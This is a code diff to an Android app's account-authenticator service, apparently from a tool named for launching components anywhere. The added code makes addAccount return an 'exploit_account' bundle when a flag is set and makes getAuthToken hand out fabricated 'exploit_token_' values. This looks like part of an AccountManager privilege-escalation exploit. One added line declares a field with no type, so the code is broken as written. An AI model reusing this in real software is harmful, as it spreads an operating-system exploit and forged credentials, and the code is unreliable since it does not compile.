@@ -2,6 +2,7 @@ package com.cfks.startanywhere;
 
 import android.accounts.AbstractAccountAuthenticator;
 import android.accounts.Account;
+import android.accounts.AccountManager;
 import android.accounts.AccountAuthenticatorResponse;
 import android.accounts.NetworkErrorException;
 import android.app.Service;
@@ -18,6 +19,7 @@ import android.os.IBinder;
 public class AuthService extends Service {
 
     public static Bundle addAccountResponse;
+    public static isBadResolve = false;
 
     @Override
     public IBinder onBind(Intent intent) {
@@ -27,6 +29,14 @@ public class AuthService extends Service {
     private static class Authenticator extends AbstractAccountAuthenticator {
         @Override
         public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException {
+        	if(isBadResolve){
+        		isBadResolve = false;
+        		Bundle result = new Bundle();
+	            result.putString(AccountManager.KEY_ACCOUNT_NAME, "exploit_account");
+	            result.putString(AccountManager.KEY_ACCOUNT_TYPE, accountType);
+	            result.putParcelable(AccountManager.KEY_ACCOUNT_AUTHENTICATOR_RESPONSE, response);
+	            return result;
+        	}
             return addAccountResponse;
         }
 
@@ -48,7 +58,11 @@ public class AuthService extends Service {
 
         @Override
         public Bundle getAuthToken(AccountAuthenticatorResponse response, Account account, String authTokenType, Bundle options) throws NetworkErrorException {
-            return null;
+            Bundle result = new Bundle();
+            result.putString(AccountManager.KEY_AUTHTOKEN, "exploit_token_" + System.currentTimeMillis());
+            result.putString(AccountManager.KEY_ACCOUNT_NAME, account.name);
+            result.putString(AccountManager.KEY_ACCOUNT_TYPE, account.type);
+            return result;
         }
 
         @Override
@@ -63,7 +77,9 @@ public class AuthService extends Service {
 
         @Override
         public Bundle hasFeatures(AccountAuthenticatorResponse response, Account account, String[] features) throws NetworkErrorException {
-            return null;
+            Bundle result = new Bundle();
+            result.putBoolean(AccountManager.KEY_BOOLEAN_RESULT, false);
+            return result;
         }
     }
 }
